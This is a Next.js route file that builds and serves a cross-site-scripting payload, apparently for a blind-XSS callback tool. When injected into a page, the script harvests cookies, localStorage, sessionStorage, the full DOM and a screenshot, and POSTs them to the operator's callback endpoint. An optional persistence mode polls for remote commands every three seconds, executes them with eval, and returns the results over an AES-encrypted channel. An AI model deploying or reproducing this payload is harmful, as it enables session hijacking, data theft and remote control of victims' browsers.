import { NextRequest, NextResponse } from 'next/server';
import { queryOne, Setting } from '@/lib/db';

// CORS headers - allow everything
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH',
  'Access-Control-Allow-Headers': '*',
  'Access-Control-Allow-Private-Network': 'true',
  'Access-Control-Max-Age': '86400',
};

async function getSetting(key: string, defaultValue: string): Promise<string> {
  try {
    const setting = await queryOne<Setting>(
      'SELECT value FROM settings WHERE key = $1',
      [key]
    );
    return setting?.value || defaultValue;
  } catch {
    return defaultValue;
  }
}

// Handle CORS preflight
export async function OPTIONS(request: NextRequest) {
  const headers: Record<string, string> = { ...corsHeaders };
  if (request.headers.get('Access-Control-Request-Private-Network')) {
    headers['Access-Control-Allow-Private-Network'] = 'true';
  }
  return new NextResponse(null, { status: 204, headers });
}

// AES-256-CBC encryption/decryption functions for payload (minified)
// Note: Web Crypto API only works in secure contexts (HTTPS or localhost)
// Payload will auto-fallback to unencrypted mode on HTTP targets
function getAesPayloadCode(key: string): string {
  // Key is 64 hex chars (32 bytes = 256 bits)
  // _cs = crypto.subtle available flag
  return `
var _k="${key}";var _cs=!!(window.crypto&&window.crypto.subtle);
function _h2b(h){for(var b=[],i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return new Uint8Array(b)}
function _b2h(b){return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
async function _enc(t){if(!_cs)return null;var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['encrypt']);var iv=crypto.getRandomValues(new Uint8Array(16));var e=await crypto.subtle.encrypt({name:'AES-CBC',iv:iv},k,new TextEncoder().encode(t));return _b2h(iv)+_b2h(new Uint8Array(e))}
async function _dec(c){if(!_cs)return null;try{var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['decrypt']);var iv=_h2b(c.substring(0,32));var d=_h2b(c.substring(32));var p=await crypto.subtle.decrypt({name:'AES-CBC',iv:iv},k,d);return new TextDecoder().decode(p)}catch(e){return null}}
`.replace(/\n/g, '');
}

export async function GET(request: NextRequest) {
  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || `http://${request.headers.get('host')}`;
  const cb = `${baseUrl}/api/callback`;
  const ps = `${baseUrl}/api/persist`;

  const screenshotEnabled = await getSetting('screenshot_enabled', 'true') === 'true';
  const persistentEnabled = await getSetting('persistent_enabled', 'false') === 'true';
  const persistentKey = await getSetting('persistent_key', '');

  // Build payload  
  let js = `(function(){if(window.__n)return;window.__n=1;`;

  // Data collection
  js += `var d={uri:location.href,origin:location.hostname,referer:document.referrer,"user-agent":navigator.userAgent,cookies:document.cookie,timestamp:new Date().toISOString(),screenWidth:screen.width,screenHeight:screen.height};`;
  js += `try{var l={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(k)}d.localstorage=JSON.stringify(l)}catch(e){}`;
  js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
  js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>500000)d.dom=d.dom.substring(0,500000)}catch(e){}`;

  // Send function - FIXED: onload inside send()
  js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
  js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id}}catch(e){}};`;
  js += `x.send(JSON.stringify(d))}`;

  if (screenshotEnabled) {
    js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";sc.onload=function(){html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:document.documentElement.scrollWidth,height:Math.min(document.documentElement.scrollHeight,3000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.9);send()}).catch(send)};sc.onerror=send;document.head.appendChild(sc);`;
  } else {
    js += `send();`;
  }

  if (persistentEnabled) {
    const useEncryption = persistentKey && persistentKey.length === 64;
    
    if (useEncryption) {
      // Add AES functions
      js += getAesPayloadCode(persistentKey);
      
      // Encrypted poll loop with fallback for HTTP (no crypto.subtle)
      // Client sends {rid, nocrypto: true} if crypto.subtle is not available
      js += `(async function p(){setTimeout(async function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=async function(){try{var r=JSON.parse(x.responseText);`;
      // Check if we have crypto available
      js += `if(r.cmd){var cmd=_cs?await _dec(r.cmd):r.cmd;if(!cmd){p();return}`;
      // Execute command and capture result
      js += `var result;try{result=eval(cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back - encrypt if crypto available
      js += `if(result!==undefined){var res=typeof result==="string"?result:JSON.stringify(result);var enc=_cs?await _enc(res):null;var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:enc||res,encrypted:!!enc}))}`;
      js += `}}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid,nocrypto:!_cs}))},3000)})();`;
    } else {
      // Unencrypted poll loop (legacy)
      js += `(function p(){setTimeout(function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=function(){try{var r=JSON.parse(x.responseText);`;
      js += `if(r.cmd){`;
      // Execute command and capture result
      js += `var result;try{result=eval(r.cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back if there is one (not undefined and not a DOM alert/redirect)
      js += `if(result!==undefined){var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:typeof result==="string"?result:JSON.stringify(result)}))}}`;
      js += `}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid}))},3000)})();`;
    }
  }

  js += `})();`;

  return new NextResponse(js, {
    status: 200,
    headers: {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      ...corsHeaders,
    },
  });
}
